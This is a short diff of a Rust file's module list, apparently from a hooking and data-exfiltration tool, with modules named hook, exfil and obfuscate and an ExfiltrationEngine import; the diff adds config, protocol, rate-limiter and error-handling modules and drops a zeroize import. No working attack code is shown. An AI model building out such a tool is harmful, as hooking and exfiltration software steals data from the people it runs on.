@@ -1,12 +1,16 @@
 use std::sync::Arc;
 use tokio::sync::mpsc;
-use zeroize::Zeroize;
 
 mod hook;
 mod exfil;
 mod crypto;
 mod buffer;
 mod obfuscate;
+mod config;
+mod proto;
+mod rate_limiter;
+mod constants;
+mod error_handling;
 
 use hook::HookManager;
 use exfil::ExfiltrationEngine;
